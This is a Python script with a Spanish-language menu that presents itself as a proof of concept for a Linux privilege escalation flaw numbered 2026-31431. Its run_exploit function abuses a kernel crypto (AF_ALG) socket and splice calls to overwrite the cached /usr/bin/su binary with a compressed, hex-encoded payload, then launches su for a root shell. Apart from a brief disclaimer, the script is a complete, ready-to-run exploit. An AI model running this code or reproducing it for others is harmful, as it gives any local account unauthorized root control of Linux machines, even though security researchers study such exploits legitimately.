#!/usr/bin/env python3
import os
import sys
import zlib
import socket
import termios
import tty
import time

# --- CÃ³digos de Color ANSI ---
CLR_RESET  = "\033[0m"
CLR_BLINK  = "\033[5m"
CLR_BOLD   = "\033[1m"
BG_BLACK   = "\033[40m"
FG_WHITE   = "\033[97m"
# Colores para el MenÃº
BG_OPT1    = "\033[44m" # Azul
BG_OPT2    = "\033[41m" # Rojo
BG_OPT3    = "\033[42m" # Verde
FG_BLACK   = "\033[30m"

# --- ConfiguraciÃ³n del Banner ---
BANNER = f"""{CLR_BOLD}\033[93m
 __  __           _              _   _       __ _           _ _        
|  \/  |         | |            | | | |     / _(_)         (_) |       
| \  / | ___   __| | ___        | |_| | ___| |_ _ _ __  ___ _| |_ ___  
| |\/| |/ _ \ / _` |/ _ \       |  _  |/ _ \  _| | '_ \/ __| | __/ _ \ 
| |  | | (_) | (_| | (_) |      | | | |  __/ | | | | | \__ \ | || (_) |
|_|  |_|\___/ \__,_|\___/       \_| |_/\___|_| |_|_| |_|___/_|\__\___/ 
{CLR_RESET}\033[91m
      [ Elevamiento de privilegio a root desde 2017 - Un Hacker En Capital ]
{CLR_RESET}"""

DISCLAIMER = f"""
{BG_BLACK}{FG_WHITE}-------------------------------------------------------------------------------
 El presente script permite realizar una PoC sobre la vulnerabilidad 2026-31431 
 y permite elevar privilegio Root a cualquier cuenta de Linux.                 
 (multiples distros verificadas).                                               
                                                                                
 El fin del mismo es auditar la seguridad de sus OS y no debe ser utilizada     
 para realizar acciones maliciosas. El desarrollador no se responsabiliza       
 del uso que pueden darle al mismo.                                             
                                                                                
 Creditos de investigacion y desarrollo del script: copy.fail                   
-------------------------------------------------------------------------------{CLR_RESET}

{CLR_BLINK}{CLR_BOLD}>>> PRESIONE CUALQUIER TECLA PARA CONTINUAR (O ESC PARA SALIR) <<<{CLR_RESET}
"""

def get_key():
    fd = sys.stdin.fileno()
    old_settings = termios.tcgetattr(fd)
    try:
        tty.setraw(sys.stdin.fileno())
        ch = sys.stdin.read(1)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
    return ch

def check_privileges():
    print(f"\n{CLR_BOLD}[+] Analizando privilegios del sistema...{CLR_RESET}")
    uid = os.getuid()
    username = os.getenv('USER') or "unknown"
    groups = os.getgroups()
    
    print(f" - Usuario Actual: \033[92m{username}\033[0m (UID: {uid})")
    
    if uid == 0:
        print(" - Estado: \033[42m\033[30m Â¡ERES ROOT! \033[0m")
    else:
        print(" - Estado: \033[43m\033[30m Usuario sin privilegios elevados \033[0m")

    import grp
    try:
        group_names = [grp.getgrgid(g).gr_name for g in groups]
        print(f" - Grupos: {', '.join(group_names)}")
    except:
        print(" - Grupos: No se pudo obtener la lista.")

    input(f"\n{CLR_BOLD}Presiona Enter para volver al menÃº...{CLR_RESET}")

def run_exploit():
    print(f"\n{CLR_BOLD}\033[91m[!] Lanzando Exploit...{CLR_RESET}")
    
    def d(x): return bytes.fromhex(x)
    def c(f, t, payload_part):
        a = socket.socket(38, 5, 0)
        a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
        h = 279
        v = a.setsockopt
        v(h, 1, d('0800010000000010' + '0' * 64))
        v(h, 5, None, 4)
        u, _ = a.accept()
        o = t + 4
        i = d('00')
        u.sendmsg([b"A" * 4 + payload_part], [(h, 3, i * 4), (h, 2, b'\x10' + i * 19), (h, 4, b'\x08' + i * 3)], 32768)
        r, w = os.pipe()
        os.splice(f, w, o, offset_src=0)
        os.splice(r, u.fileno(), o)
        try: u.recv(8 + t)
        except: pass

    try:
        f = os.open("/usr/bin/su", 0)
        i = 0
        e = zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
        while i < len(e):
            c(f, i, e[i:i+4])
            i += 4
        print(f"{CLR_BOLD}[+] Payload inyectado. Abriendo shell root...{CLR_RESET}")
        os.system("su")
    except Exception as error:
        print(f"[-] Error: {error}")
        time.sleep(2)

def main():
    os.system('clear')
    print(BANNER)
    print(DISCLAIMER)
    
    key = get_key()
    if key == '\x1b': # ESC
        print("\nSaliendo...")
        sys.exit()

    while True:
        os.system('clear')
        print(BANNER)
        print(f" {BG_OPT1}{FG_BLACK} 1 {CLR_RESET} \033[94m Validar privilegios y grupos del usuario {CLR_RESET}")
        print("-" * 50)
        print(f" {BG_OPT2}{FG_BLACK} 2 {CLR_RESET} \033[91m EJECUTAR MODO HEFINSITO (Root Exploit)  {CLR_RESET}")
        print("-" * 50)
        print(f" {BG_OPT3}{FG_BLACK} 3 {CLR_RESET} \033[92m Salir del programa                     {CLR_RESET}")
        print("-" * 50)
        
        choice = input(f"\n{CLR_BOLD}Ingrese opciÃ³n > {CLR_RESET}")
        
        if choice == '1':
            check_privileges()
        elif choice == '2':
            run_exploit()
        elif choice == '3':
            print("Cerrando consola...")
            break
        else:
            print("OpciÃ³n invÃ¡lida.")
            time.sleep(1)

if __name__ == "__main__":
    main()